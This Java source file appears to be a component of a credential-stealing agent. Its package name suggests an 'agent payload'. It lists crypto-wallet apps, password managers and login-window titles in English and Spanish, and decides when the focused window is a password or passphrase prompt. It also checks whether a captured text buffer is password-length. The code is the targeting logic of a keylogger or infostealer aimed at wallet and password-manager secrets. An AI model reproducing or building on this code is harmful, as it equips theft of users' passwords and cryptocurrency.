package com.spcagentpayloa.jvmxx;

/** Password-window heuristic used when UI Automation cannot answer. */
final class PasswordHeuristic {
	private static final String[] PROCESSES = {
		"electrum", "phantom", "metamask", "rabby", "exodus", "ledger", "keepass", "1password", "bitwarden"
	};
	private static final String[] TITLES = {
		"password", "contrase\u00f1a", "passphrase", "login", "log in", "sign in", "sign-in",
		"unlock", "desbloquear", "electrum", "phantom", "metamask", "rabby", "wallet"
	};
	private static final String[] MANAGERS = {
		"keepass", "keepassxc", "bitwarden", "1password", "lastpass", "dashlane", "keeper",
		"enpass", "roboform", "proton pass", "nordpass"
	};
	private static final String[] CREDENTIAL_TITLES = {
		"passwords", "contrase\u00f1as", "credentials", "credenciales", "password manager",
		"gestor de contrase\u00f1as"
	};

	private PasswordHeuristic() {
	}

	static boolean looksLikePassword(String process, String title) {
		String name = process == null ? "" : process.toLowerCase(java.util.Locale.ROOT);
		String head = name.endsWith(".exe") ? name.substring(0, name.length() - 4) : name;
		for (String candidate : PROCESSES) {
			if (head.equals(candidate) || head.startsWith(candidate + "-") || head.contains(" " + candidate)) {
				return true;
			}
		}
		String window = title == null ? "" : title.toLowerCase(java.util.Locale.ROOT);
		for (String candidate : TITLES) {
			if (window.contains(candidate)) {
				return true;
			}
		}
		return false;
	}

	/** Stricter than {@link #looksLikePassword}: only credential managers and their pages. */
	static boolean credentialSource(String process, String title) {
		String name = process == null ? "" : process.toLowerCase(java.util.Locale.ROOT);
		String head = name.endsWith(".exe") ? name.substring(0, name.length() - 4) : name;
		for (String candidate : MANAGERS) {
			if (head.equals(candidate) || head.startsWith(candidate + " ") || head.startsWith(candidate + "-")) {
				return true;
			}
		}
		String window = title == null ? "" : title.toLowerCase(java.util.Locale.ROOT);
		for (String candidate : CREDENTIAL_TITLES) {
			if (window.contains(candidate)) {
				return true;
			}
		}
		return false;
	}

	static boolean plausible(String buffer) {		if (buffer == null) {
			return false;
		}
		int length = buffer.length();
		if (length < 6 || length > 256) {
			return false;
		}
		return !buffer.isBlank();
	}
}
